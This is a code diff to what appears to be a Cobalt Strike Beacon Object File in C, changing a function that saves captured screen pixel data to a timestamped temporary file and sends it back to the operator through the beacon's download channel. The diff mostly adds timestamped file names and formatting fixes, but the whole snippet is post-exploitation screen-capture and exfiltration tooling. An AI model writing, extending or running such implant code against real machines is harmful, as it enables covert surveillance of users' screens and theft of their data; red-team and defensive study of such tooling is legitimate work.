@@ -1,4 +1,3 @@
-
 #include "beacon.h"
 #include "bofdef.h"
 
@@ -151,30 +150,42 @@ void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
     char fileName[MAX_PATH];
     char *tempPath = MSVCRT$getenv("TEMP");
 
+    // Get current timestamp
+    time_t rawtime;
+    struct tm *timeinfo;
+    MSVCRT$time(&rawtime);
+    timeinfo = MSVCRT$localtime(&rawtime);
+
+    // Format timestamp
+    char timestamp[20];
+    MSVCRT$strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
+
+    // Construct file name
     if (tempPath == NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to get temporary path, using current directory\n");
-        MSVCRT$sprintf(fileName, "%doo%d.tmp", width, height);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get temporary path, using current directory\n");
+        MSVCRT$sprintf(fileName, "%s_%doo%d.tmp", timestamp, width, height);
     } else {
-        MSVCRT$sprintf(fileName, "%s\\%doo%d.tmp", tempPath, width, height);
+        MSVCRT$sprintf(fileName, "%s\\%s_%doo%d.tmp", tempPath, timestamp, width, height);
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT,"Output path: %s\n", fileName);
+    BeaconPrintf(CALLBACK_OUTPUT, "Output path: %s\n", fileName);
 
     FILE* file = MSVCRT$fopen(fileName, "wb");
     if (file == NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open file for writing: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open file for writing: %s\n", fileName);
         return;
     }
 
     size_t bytesWritten = MSVCRT$fwrite(pBits, pitch * height, 1, file);
     if (bytesWritten != 1) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to write pixel data to file: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to write pixel data to file: %s\n", fileName);
     }
 
     MSVCRT$fclose(file);
     downloadFile(fileName, MSVCRT$strlen(fileName), pBits, pitch * height);
     return;
 }
+
 
 // BOF entry function
 int go() {
